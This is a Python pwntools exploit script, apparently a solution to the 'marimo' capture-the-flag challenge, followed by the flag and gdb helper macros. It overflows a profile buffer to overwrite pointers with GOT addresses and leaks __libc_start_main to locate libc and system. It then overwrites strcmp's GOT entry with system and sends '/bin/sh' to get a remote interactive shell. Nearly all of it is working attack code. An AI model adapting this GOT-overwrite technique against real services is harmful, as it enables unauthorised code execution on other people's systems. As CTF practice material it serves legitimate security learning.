from pwn import *
import time
import sys

def marimo(DEBUG):
	t = 0.3
	def Special(name, profile):
		r.sendline("show me the marimo")
		r.recvuntil(">> ")
		r.sendline(name)
		# time.sleep(t)
		r.recvuntil(">> ")
		r.sendline(profile)
		# time.sleep(t)
		return r.recvuntil(">> ")
		
		
	def Shell(idx):
		r.sendline("S")
		r.recvuntil(">> ")
		r.sendline(str(idx))
		res = r.recvuntil(" dollars.")
		r.sendline("S")
		r.recvuntil(">> ")
		return res
	
	def View(idx, newprofile=""):
		r.sendline("V")
		r.recvuntil(">> ")
		r.sendline(str(idx))
		res = r.recvuntil(">> ")
		if len(newprofile)>0:
			r.sendline("M")
			r.recvuntil(">> ")
			r.sendline(newprofile)
			res = r.recvuntil(">> ")
		# time.sleep(t)
		r.sendline("B")
		r.recvuntil(">> ")
		return res
	def Wait(seconds):
		for i in xrange(seconds):
			log.info("%d/%d seconds" % (i,seconds))
			time.sleep(1)
		
	def Exit():
		r.sendline("Q")
	
	if DEBUG=="1":
		t = 0.005
		offset_system = 0x45390
		offset__libc_start_main = 0x20740
		r = process("./marimo")
		raw_input("debug?")
	elif DEBUG=="2":
		# libc6_2.23-0ubuntu10_amd64
		offset_system = 0x45390
		offset__libc_start_main = 0x20740
		HOST = 'ch41l3ng3s.codegate.kr'
		PORT = 3333
		r = remote(HOST,PORT)
	
	strcmp_got = 0x603040
	puts_got = 0x603018
	exit_got = 0x603070
	malloc_got = 0x603050
	__libc_start_main_got = 0x603030
	r.recvuntil(">> ")
	Special("A"*0x10,"B"*0x20)
	Special("C"*0x10,"D"*0x20)
	Special("E"*0x10,"F"*0x20)
	Wait(0x48)
	payload = "A"*0x30
	payload += p64(strcmp_got) # time
	payload += p64(__libc_start_main_got) # name
	payload += p64(strcmp_got) # profile
	View(0, payload)
	res = View(1)
	print repr(res).replace("\\n","\n")
	__libc_start_main = u64(res.splitlines()[5][7:].ljust(8,"\x00"))
	log.info('__libc_start_main: %#x' % __libc_start_main)
	baselibc = __libc_start_main - offset__libc_start_main
	system	= baselibc + offset_system
	log.info('baselibc: %#x' % baselibc)
	log.info('system: %#x' % system)
	payload = p64(system)[:-1]
	View(1, payload)
	raw_input("?")
	r.sendline("/bin/sh\x00")
	r.interactive()

marimo(sys.argv[1])
# But_every_cat_is_more_cute_than_Marimo

"""
define ff
echo ============== LIST:\n
telescope 0x6030E0 15
echo ============== COUNT:\n
telescope 0x6030C0 1
echo ============== MONEY:\n
telescope 0x603158 1
echo ============================\n
end

define fa
x/40gx *0x6030E0-0x10
end
"""